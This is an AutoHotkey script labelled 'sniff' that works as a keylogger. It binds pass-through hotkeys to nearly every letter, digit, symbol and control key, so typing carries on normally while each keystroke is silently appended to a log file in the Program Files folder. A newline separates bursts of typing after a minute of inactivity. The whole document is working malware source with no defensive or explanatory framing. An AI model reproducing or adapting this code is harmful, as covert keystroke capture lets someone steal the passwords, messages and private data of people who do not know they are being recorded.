;sniff

time := 0
late := 60
file = %A_ProgramFiles%\LogFile.txt

Loop
{
	if (time < late+1) time++
	Sleep 1000
}

~Tab::FileAppend, _Tab_, %file%
~Space::FileAppend, _Space_, %file%
~Enter::FileAppend, _Enter_, %file%
~BS::FileAppend, _BS_, %file%
~Del::FileAppend, _Del_, %file%
~Ins::FileAppend, _Ins_, %file%
~Home::FileAppend, _Home_, %file%
~End::FileAppend, _End_, %file%
~Left::FileAppend, _Left_, %file%
~Right::FileAppend, _Right_, %file%
~ScrollLock::FileAppend, _ScrollLock_, %file%
~CapsLock::FileAppend, _CapsLock_, %file%
~NumLock::FileAppend, _NumLock_, %file%

~`::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, _-1_, %file%
time := 0
return
~+`::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, ~, %file%
time := 0
return

~1::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, 1, %file%
time := 0
return
~+1::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, !, %file%
time := 0
return

~2::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, 2, %file%
time := 0
return
~+2::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, @, %file%
time := 0
return

~3::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, 3, %file%
time := 0
return
~+3::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, #, %file%
time := 0
return

~4::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, 4, %file%
time := 0
return
~+4::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, $, %file%
time := 0
return

~5::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, 5, %file%
time := 0
return
~+5::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, _SHIFT 5_, %file%
time := 0
return

~6::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, 6, %file%
time := 0
return
~+6::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, ^, %file%
time := 0
return

~7::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, 7, %file%
time := 0
return
~+7::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, &, %file%
time := 0
return

~8::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, 8, %file%
time := 0
return
~+8::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, *, %file%
time := 0
return

~9::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, 9, %file%
time := 0
return
~+9::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, (, %file%
time := 0
return

~0::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, 0, %file%
time := 0
return
~+0::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, ), %file%
time := 0
return

~-::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, -, %file%
time := 0
return
~+-::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, _, %file%
time := 0
return

~=::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, =, %file%
time := 0
return
~+=::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, +, %file%
time := 0
return

~a::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, a, %file%
time := 0
return
~+a::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, A, %file%
time := 0
return

~b::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, b, %file%
time := 0
return
~+b::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, B, %file%
time := 0
return

~c::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, c, %file%
time := 0
return
~+c::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, C, %file%
time := 0
return

~d::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, d, %file%
time := 0
return
~+d::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, D, %file%
time := 0
return

~e::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, e, %file%
time := 0
return
~+e::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, E, %file%
time := 0
return

~f::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, f, %file%
time := 0
return
~+f::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, F, %file%
time := 0
return

~g::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, g, %file%
time := 0
return
~+g::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, G, %file%
time := 0
return

~h::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, h, %file%
time := 0
return
~+h::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, H, %file%
time := 0
return

~i::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, i, %file%
time := 0
return
~+i::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, I, %file%
time := 0
return

~j::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, j, %file%
time := 0
return
~+j::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, J, %file%
time := 0
return

~k::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, k, %file%
time := 0
return
~+k::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, K, %file%
time := 0
return

~l::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, l, %file%
time := 0
return
~+l::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, L, %file%
time := 0
return

~m::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, m, %file%
time := 0
return
~+m::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, M, %file%
time := 0
return

~n::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, n, %file%
time := 0
return
~+n::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, N, %file%
time := 0
return

~o::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, o, %file%
time := 0
return
~+o::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, O, %file%
time := 0
return

~p::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, p, %file%
time := 0
return
~+p::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, P, %file%
time := 0
return

~q::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, q, %file%
time := 0
return
~+q::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, Q, %file%
time := 0
return

~r::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, r, %file%
time := 0
return
~+r::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, R, %file%
time := 0
return

~s::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, s, %file%
time := 0
return
~+s::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, S, %file%
time := 0
return

~t::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, t, %file%
time := 0
return
~+t::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, T, %file%
time := 0
return

~u::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, u, %file%
time := 0
return
~+u::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, U, %file%
time := 0
return

~v::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, v, %file%
time := 0
return
~+v::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, V, %file%
time := 0
return

~w::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, w, %file%
time := 0
return
~+w::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, W, %file%
time := 0
return

~x::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, x, %file%
time := 0
return
~+x::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, X, %file%
time := 0
return

~y::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, y, %file%
time := 0
return
~+y::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, Y, %file%
time := 0
return

~z::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, z, %file%
time := 0
return
~+z::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, Z, %file%
time := 0
return

~[::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, [, %file%
time := 0
return
~+[::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, {, %file%
time := 0
return

~]::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, ], %file%
time := 0
return
~+]::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, }, %file%
time := 0
return

~\::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, \, %file%
time := 0
return
~+\::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, |, %file%
time := 0
return

~;::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, _+l_, %file%
time := 0
return
~+;::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, :, %file%
time := 0
return

~'::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, ', %file%
time := 0
return
~+'::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, ", %file%
time := 0
return

~,::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, _+m_, %file%
time := 0
return
~+,::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, <, %file%
time := 0
return

~.::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, ., %file%
time := 0
return
~+.::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, >, %file%
time := 0
return

~/::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, /, %file%
time := 0
return
~+/::
if (time > late) {
FileAppend, `n, %file%
}
FileAppend, ?, %file%
time := 0
return